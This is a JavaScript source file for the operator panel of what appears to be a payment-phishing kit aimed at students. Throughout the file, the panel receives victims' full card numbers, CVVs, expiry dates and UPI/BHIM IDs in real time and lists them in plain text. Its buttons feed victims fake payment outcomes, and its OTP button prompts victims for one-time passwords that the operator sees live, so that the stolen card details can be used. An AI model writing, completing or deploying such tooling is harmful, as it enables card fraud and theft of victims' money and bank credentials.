// Admin Panel - Real-Time Card Submission Management
// WITH PERSISTENT COMMAND EXECUTION STATE

let socket = null;
const submissions = new Map(); // Store submissions by sessionId

// Initialize Socket.IO Connection
function initializeConnection() {
    socket = io('http://localhost:3000', {
        transports: ['websocket', 'polling'],
        reconnection: true,
        reconnectionDelay: 1000,
        reconnectionAttempts: 10
    });

    // Connection Events
    socket.on('connect', () => {
        console.log('? Connected to server');
        updateConnectionStatus(true);
        setTimeout(() => loadExistingSubmissions(), 1000);
    });

    socket.on('disconnect', () => {
        console.log('? Disconnected from server');
        updateConnectionStatus(false);
    });

    socket.on('connect_error', (error) => {
        console.error('Connection error:', error);
        updateConnectionStatus(false);
    });

    // Connection Update
    socket.on('connectionUpdate', (data) => {
        updateConnectionCount(data.activeConnections || 0);
    });

    // Real-Time Card Details Received
    socket.on('cardDetailsReceived', (data) => {
        console.log('?? New card details received:', data);
        handleNewCardSubmission(data);
    });

    // UPI Details Received
    socket.on('upiDetailsReceived', (data) => {
        console.log('?? New UPI details received:', data);
        handleNewUpiSubmission(data);
    });

    // BHIM Details Received
    socket.on('bhimDetailsReceived', (data) => {
        console.log('?? New BHIM details received:', data);
        handleNewBhimSubmission(data);
    });

    // Payment Status Updates
    socket.on('paymentCompleted', (data) => {
        console.log('? Payment completed:', data);
        updateSubmissionStatus(data.sessionId, 'completed');
    });

    socket.on('paymentFailed', (data) => {
        console.log('? Payment failed:', data);
        updateSubmissionStatus(data.sessionId, 'failed', data.reason);
    });
    
    // OTP Response Listener
    socket.on('otp-submitted', (data) => {
        console.log('🔐 OTP received:', data);
        const submission = submissions.get(data.sessionId);
        if (submission) {
            submission.otp = data.otp;
            showNotification('OTP: ' + data.otp, 'success');
        }
    });
}

// Update Connection Status Indicator
function updateConnectionStatus(isConnected) {
    const statusDot = document.querySelector('.status-dot');
    const statusText = document.querySelector('.status-text');
    
    if (isConnected) {
        statusDot.style.background = '#00ff00';
        statusText.textContent = 'Live';
    } else {
        statusDot.style.background = '#ff0000';
        statusText.textContent = 'Disconnected';
    }
}

// Update Connection Count
function updateConnectionCount(count) {
    const connectionCount = document.getElementById('connectionCount');
    if (connectionCount) {
        connectionCount.textContent = `Connections: ${count}`;
    }
}

// Handle New Card Submission
function handleNewCardSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'card',
        student: data.student,
        cardDetails: data.cardDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New UPI Submission
function handleNewUpiSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'upi',
        student: data.student,
        upiDetails: data.upiDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Handle New BHIM Submission
function handleNewBhimSubmission(data) {
    const submission = {
        id: data.sessionId,
        type: 'bhim',
        student: data.student,
        bhimDetails: data.bhimDetails,
        amount: data.amount,
        timestamp: data.timestamp || new Date().toISOString(),
        status: data.status || 'processing',
        commandExecuted: data.commandExecuted || false
    };
    
    submissions.set(data.sessionId, submission);
    renderSubmission(submission, true);
    hideEmptyState();
}

// Render Submission Card in SINGLE-LINE FORMAT
function renderSubmission(submission, isNew = false) {
    const grid = document.getElementById('submissionsGrid');
    
    // Check if card already exists
    const existingCard = document.getElementById(`card-${submission.id}`);
    if (existingCard) {
        existingCard.remove();
    }
    
    const card = document.createElement('div');
    card.className = `submission-card${isNew ? ' new' : ''}`;
    card.id = `card-${submission.id}`;
    
    if (isNew) {
        setTimeout(() => {
            card.classList.remove('new');
        }, 3000);
    }
    
    const formattedTime = formatTimestamp(submission.timestamp);
    const shortSessionId = submission.id.substring(0, 12);
    
    // Determine if commands should be disabled
    const commandsDisabled = submission.commandExecuted || 
                            submission.status === 'completed' || 
                            submission.status === 'failed' || 
                            submission.status === 'invalid';
    
    let detailsHtml = '';
    
    if (submission.type === 'card') {
        detailsHtml = `
            <span class="submission-type">CARD</span>
            <span class="submission-id-short">${shortSessionId}</span>
            <span class="student-name-short">${submission.student.name}</span>
            <span class="student-roll-short">${submission.student.rollNumber}</span>
            <span class="detail-inline card-number">${submission.cardDetails.cardNumber}</span>
            <span class="detail-inline expiry">${submission.cardDetails.expiryDate}</span>
            <span class="detail-inline cvv">${submission.cardDetails.cvv}</span>
            <span class="detail-inline holder">${submission.cardDetails.cardHolderName}</span>
            <span class="amount-inline">?${submission.amount.toLocaleString('en-IN')}</span>
            <span class="submission-time-short">${formattedTime}</span>
            <span class="status-badge status-${submission.status}">${submission.status.toUpperCase()}</span>
        `;
    } else if (submission.type === 'upi') {
        detailsHtml = `
            <span class="submission-type">UPI</span>
            <span class="submission-id-short">${shortSessionId}</span>
            <span class="student-name-short">${submission.student.name}</span>
            <span class="student-roll-short">${submission.student.rollNumber}</span>
            <span class="detail-inline upi-id">${submission.upiDetails.upiId}</span>
            <span class="detail-inline">${submission.upiDetails.upiApp || 'Unknown'}</span>
            <span class="amount-inline">?${submission.amount.toLocaleString('en-IN')}</span>
            <span class="submission-time-short">${formattedTime}</span>
            <span class="status-badge status-${submission.status}">${submission.status.toUpperCase()}</span>
        `;
    } else if (submission.type === 'bhim') {
        detailsHtml = `
            <span class="submission-type">BHIM</span>
            <span class="submission-id-short">${shortSessionId}</span>
            <span class="student-name-short">${submission.student.name}</span>
            <span class="student-roll-short">${submission.student.rollNumber}</span>
            <span class="detail-inline upi-id">${submission.bhimDetails.upiId}</span>
            <span class="detail-inline">${submission.bhimDetails.upiApp || 'Unknown'}</span>
            <span class="amount-inline">?${submission.amount.toLocaleString('en-IN')}</span>
            <span class="submission-time-short">${formattedTime}</span>
            <span class="status-badge status-${submission.status}">${submission.status.toUpperCase()}</span>
        `;
    }
    
    card.innerHTML = `
        ${isNew ? '<div class="new-badge">NEW</div>' : ''}
        ${detailsHtml}
        <div class="commands-inline">
            <button class="command-btn btn-otp" onclick="executeOtpCommand('${submission.id}')" ${commandsDisabled || submission.otpRequested ? 'disabled' : ''}>
                🔐 OTP
            </button>
            <button class="command-btn btn-success" onclick="executeCommand('${submission.id}', 'success')" ${commandsDisabled ? 'disabled' : ''}>
                ? Success
            </button>
            <button class="command-btn btn-fail" onclick="executeCommand('${submission.id}', 'fail')" ${commandsDisabled ? 'disabled' : ''}>
                ? Fail
            </button>
            <button class="command-btn btn-invalid" onclick="executeCommand('${submission.id}', 'invalid')" ${commandsDisabled ? 'disabled' : ''}>
                ?? Invalid
            </button>
        </div>
    `;
    
    // Insert at the beginning (newest first)
    grid.insertBefore(card, grid.firstChild);
}

// Execute Admin Command with PERSISTENT STATE
async function executeCommand(sessionId, action) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    // Prevent duplicate execution
    if (submission.commandExecuted) {
        showNotification('Command already executed for this submission', 'warning');
        return;
    }
    
    console.log(`?? Executing command: ${action} for session: ${sessionId}`);
    
    let newStatus = 'processing';
    let reason = null;
    
    if (action === 'success') {
        // Approve payment
        socket.emit('adminCommand', {
            command: 'approvePayment',
            sessionId: sessionId,
            action: 'approve'
        });
        
        newStatus = 'completed';
        showNotification(`? Payment approved for ${submission.student.name}`, 'success');
        
    } else if (action === 'fail') {
        // Reject payment
        reason = prompt('Enter rejection reason:', 'Card declined') || 'Card declined';
        
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'reject',
            reason: reason
        });
        
        newStatus = 'failed';
        showNotification(`? Payment rejected for ${submission.student.name}`, 'error');
        
    } else if (action === 'invalid') {
        // Mark as invalid
        socket.emit('adminCommand', {
            command: 'rejectPayment',
            sessionId: sessionId,
            action: 'invalid',
            reason: 'Invalid card details'
        });
        
        newStatus = 'invalid';
        reason = 'Invalid card details';
        showNotification(`?? Payment marked as invalid for ${submission.student.name}`, 'warning');
    }
    
    // CRITICAL: Update submission status in database via API
    try {
        const response = await fetch(`/api/admin/submissions/${sessionId}/execute-command`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                action: action,
                status: newStatus,
                reason: reason
            })
        });
        
        const result = await response.json();
        
        if (result.success) {
            console.log('? Command execution persisted to database');
            updateSubmissionStatus(sessionId, newStatus, reason);
        } else {
            console.error('? Failed to persist command execution');
            showNotification('Failed to save command state', 'error');
        }
    } catch (error) {
        console.error('Error persisting command:', error);
        showNotification('Error saving command state', 'error');
    }
}



// Update Submission Status
function updateSubmissionStatus(sessionId, status, reason = null) {
    const submission = submissions.get(sessionId);
    if (submission) {
        submission.status = status;
        submission.commandExecuted = true;
        if (reason) {
            submission.failureReason = reason;
        }
        
        // Re-render the card
        renderSubmission(submission, false);
    }
}

// Show Notification
function showNotification(message, type = 'info') {
    console.log(`[${type.toUpperCase()}] ${message}`);
    
    // Create notification element
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 100px;
        right: 40px;
        background: ${type === 'success' ? '#00cc00' : type === 'error' ? '#cc0000' : type === 'warning' ? '#cc6600' : '#0066cc'};
        color: #ffffff;
        padding: 15px 20px;
        border-radius: 8px;
        box-shadow: 0 4px 20px rgba(0, 0, 0, 0.5);
        z-index: 1000;
        font-size: 14px;
        font-weight: 500;
        animation: slideInRight 0.3s ease-out;
    `;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOutRight 0.3s ease-out';
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 3000);
}

// Hide Empty State
function hideEmptyState() {
    const emptyState = document.getElementById('emptyState');
    if (emptyState) {
        emptyState.style.display = 'none';
    }
}

// Format Timestamp
function formatTimestamp(timestamp) {
    const date = new Date(timestamp);
    const now = new Date();
    const diffMs = now - date;
    const diffMins = Math.floor(diffMs / 60000);
    
    if (diffMins < 1) {
        return 'Just now';
    } else if (diffMins < 60) {
        return `${diffMins}m ago`;
    } else {
        const hours = date.getHours().toString().padStart(2, '0');
        const minutes = date.getMinutes().toString().padStart(2, '0');
        return `${hours}:${minutes}`;
    }
}

// Add CSS animations
const style = document.createElement('style');
style.textContent = `
    @keyframes slideInRight {
        from {
            transform: translateX(400px);
            opacity: 0;
        }
        to {
            transform: translateX(0);
            opacity: 1;
        }
    }
    

    
    .btn-otp {
        background: #9333ea;
        color: white;
    }
    .btn-otp:hover:not(:disabled) {
        background: #7e22ce;
    }
    .btn-otp:disabled {
        background: #6b7280;
        cursor: not-allowed;
        opacity: 0.5;
    }
    @keyframes slideOutRight {
        from {
            transform: translateX(0);
            opacity: 1;
        }
        to {
            transform: translateX(400px);
            opacity: 0;
        }
    }
`;
document.head.appendChild(style);

// Load existing submissions from database
async function loadExistingSubmissions() {
    try {
        const response = await fetch('/api/admin/submissions');
        const result = await response.json();
        
        if (result.success && result.submissions && result.submissions.length > 0) {
            console.log('?? Loaded ' + result.total + ' previous submissions');
            
            result.submissions.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
            
            result.submissions.forEach(submission => {
                const data = {
                    sessionId: submission.sessionId,
                    student: submission.student,
                    amount: submission.amount,
                    timestamp: submission.timestamp,
                    status: submission.status || 'processing',
                    commandExecuted: submission.commandExecuted || false
                };
                
                // Create submission object and render WITHOUT isNew flag (loaded from DB)
                let submissionObj;
                if (submission.type === 'card' && submission.cardDetails) {
                    data.cardDetails = submission.cardDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'card',
                        student: data.student,
                        cardDetails: data.cardDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted
                    };
                } else if (submission.type === 'upi' && submission.upiDetails) {
                    data.upiDetails = submission.upiDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'upi',
                        student: data.student,
                        upiDetails: data.upiDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted
                    };
                } else if (submission.type === 'bhim' && submission.bhimDetails) {
                    data.bhimDetails = submission.bhimDetails;
                    submissionObj = {
                        id: data.sessionId,
                        type: 'bhim',
                        student: data.student,
                        bhimDetails: data.bhimDetails,
                        amount: data.amount,
                        timestamp: data.timestamp,
                        status: data.status,
                        commandExecuted: data.commandExecuted
                    };
                }
                
                if (submissionObj) {
                    submissions.set(submissionObj.id, submissionObj);
                    // Render with isNew=false for loaded submissions (only show NEW for real-time)
                    renderSubmission(submissionObj, false);
                    hideEmptyState();
                }
            });
        }
    } catch (error) {
        console.error('Error loading submissions:', error);
    }
}


// Execute OTP Command
function executeOtpCommand(sessionId) {
    const submission = submissions.get(sessionId);
    if (!submission) {
        console.error('Submission not found:', sessionId);
        return;
    }
    
    if (submission.otpRequested) {
        showNotification('OTP already requested for this submission', 'warning');
        return;
    }
    
    console.log('🔐 Requesting OTP for session: ' + sessionId);
    
    socket.emit('adminCommand', {
        command: 'otp',
        sessionId: sessionId
    });
    
    submission.otpRequested = true;
    renderSubmission(submission, false);
    
    showNotification('🔐 OTP requested for ' + submission.student.name, 'info');
}
// Initialize on page load
window.addEventListener('DOMContentLoaded', () => {
    console.log('?? Admin Panel initialized');
    initializeConnection();
});
